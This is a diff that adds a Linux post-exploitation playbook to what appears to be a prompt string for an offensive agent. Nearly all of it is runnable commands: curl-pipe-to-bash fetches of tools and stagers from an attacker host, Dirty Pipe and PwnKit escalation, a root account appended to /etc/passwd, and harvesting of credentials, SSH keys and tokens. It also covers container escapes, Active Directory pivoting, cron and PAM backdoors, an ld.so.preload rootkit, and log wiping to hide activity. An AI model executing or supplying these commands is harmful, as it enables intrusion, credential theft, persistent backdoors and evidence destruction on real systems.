@@ -112,6 +112,64 @@ Rules:
     → Golden Ticket: `mimikatz kerberos::golden /user:Administrator /domain:<dom> /sid:<domain-sid> /krbtgt:<hash> /ptt`
     → Golden Ticket persists even after krbtgt password change (if only rotated once — rotate twice to invalidate)
     → Diamond Ticket (stealthier): `Rubeus diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512` — forges within real TGT request, avoids MS ticket anomaly detection
+
+── LINUX ENGAGEMENT ─────────────────────────────────────────────────────────
+
+L1. Initial triage (no root):
+    → `id && uname -r && cat /etc/os-release` — kernel + distro baseline
+    → `ps auxf` and `ss -tlnp` — running services, open ports
+    → `find / -perm -4000 -type f 2>/dev/null` — SUID binaries
+    → `sudo -l` — (if creds known) sudo misconfigs
+    → Check capabilities: `getcap -r / 2>/dev/null`
+    → Writable crons: `ls -la /etc/cron*; cat /etc/crontab`
+
+L2. Auto-enum delivery (from C2):
+    → linpeas: `curl -sk https://LHOST/linpeas.sh | bash 2>&1 | tee /tmp/.lp`
+    → pspy (process snoop): `curl -sk https://LHOST/pspy64 -o /tmp/.ps && chmod +x /tmp/.ps && /tmp/.ps`
+    → Prioritize: SUID GTFOBins, writable PATH, sudo -l, kernel CVEs (linpeas colors: yellow/red)
+
+L3. Privilege escalation decision tree:
+    → SUID found → cross-reference GTFOBins: `curl -sk https://LHOST/gtfo -o /tmp/.gt && chmod +x /tmp/.gt && /tmp/.gt -n <binary>`
+    → sudo -l shows NOPASSWD binary → GTFOBins: `sudo <binary> <escape>`
+    → Writable /etc/passwd → `echo 'r00t::0:0:r00t:/root:/bin/bash' >> /etc/passwd && su r00t`
+    → Kernel ≤5.16 (no patch) → Dirty Pipe: `curl -sk https://LHOST/traitor-amd64 -o /tmp/.tr && chmod +x /tmp/.tr && /tmp/.tr -p`
+    → polkit ≤0.105 (2022 Ubuntu/Debian) → PwnKit: `curl -sk https://LHOST/cve-2021-4034 -o /tmp/.pk && chmod +x /tmp/.pk && /tmp/.pk`
+    → LD_PRELOAD in sudo env_keep → compile .so with constructor calling setuid(0) → `sudo LD_PRELOAD=/tmp/.so <allowed_cmd>`
+    → NFS no_root_squash → mount share → plant SUID binary from attacker box
+
+L4. Credential harvesting:
+    → `/etc/shadow` (if readable/backup) → hashcat -m 1800 (sha512crypt)
+    → SSH keys: `find / -name id_rsa 2>/dev/null; find / -name "*.pem" 2>/dev/null`
+    → Memory dump for cleartext: `curl -sk https://LHOST/mimipenguin.sh | bash` (GDM/gnome-keyring/sshd processes)
+    → Browser creds + SSH/Git/Wallet: `curl -sk https://LHOST/lazagne -o /tmp/.lz && chmod +x /tmp/.lz && /tmp/.lz all`
+    → Bash/zsh history: `cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'pass|key|token|secret|api'`
+    → Environment vars: `env | grep -iE 'pass|key|token|secret|aws|azure'`
+    → .git configs and .netrc: `find ~ /opt /srv /var/www -name .netrc -o -name .git/config 2>/dev/null | xargs grep -l password`
+
+L5. Container escape (if in Docker/K8s):
+    → Detect: `cat /proc/1/cgroup | grep docker; ls /.dockerenv`
+    → Auto-check + escape: `curl -sk https://LHOST/deepce.sh | bash`
+    → Full escape toolkit (Leaky Vessels, runc, token steal): `curl -sk https://LHOST/cdk_linux_amd64 -o /tmp/.cdk && chmod +x /tmp/.cdk && /tmp/.cdk run auto-escape`
+    → Docker socket mounted: `curl --unix-socket /var/run/docker.sock http://localhost/images/json` → RCE via container create+exec
+    → Privileged container: `fdisk -l` → mount host disk → chroot
+
+L6. Linux → AD pivot:
+    → krb5.conf + ccache files: `find / -name ccache -o -name "*.ccache" 2>/dev/null; env | grep KRB5`
+    → Use ccache for impacket: `KRB5CCNAME=/tmp/krb5cc_1000 python3 secretsdump.py -k -no-pass DC01.corp.local`
+    → Kerberoast from Linux: `python3 GetUserSPNs.py DOMAIN/user:pass -dc-ip <DC> -request`
+    → ADCS from Linux: `certipy find -u user@domain -p pass -dc-ip <DC> -vulnerable` then `certipy req -ca <CA> -template <TPL> -upn administrator@domain`
+    → SMB lateral: `nxc smb <subnet>/24 -u user -p pass --shares` → `nxc smb <host> -u user -p pass -x 'whoami'`
+
+L7. Persistence (post-root):
+    → SSH key: `echo '<pubkey>' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys`
+    → Cron: `echo '* * * * * root curl -sk https://LHOST/<stager> | bash' >> /etc/crontab`
+    → PAM backdoor (magic password): deploy PAMSkeletonKey .so — any password accepted for any user
+    → LD_PRELOAD system-wide: `echo /tmp/.rootkit.so >> /etc/ld.so.preload` (requires root)
+
+L8. Log cleanup:
+    → `curl -sk https://LHOST/log-killer.sh | bash` — wipes wtmp/btmp/lastlog/auth.log/bash_history
+    → Manual: `> /var/log/auth.log; > ~/.bash_history; history -c`
+    → SSH logins: `utmpdump /var/log/wtmp | grep <your_ip>` — identify then patch with utmpdump -r
 """
 
 
